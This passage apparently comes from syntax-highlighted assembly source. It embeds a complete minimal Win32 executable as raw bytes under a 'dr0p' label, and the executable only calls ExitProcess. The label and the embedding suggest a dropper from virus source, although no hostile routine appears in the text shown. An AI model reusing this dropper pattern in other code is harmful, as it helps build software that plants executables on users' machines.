</span><span class="sc5">dr0p</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">023h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
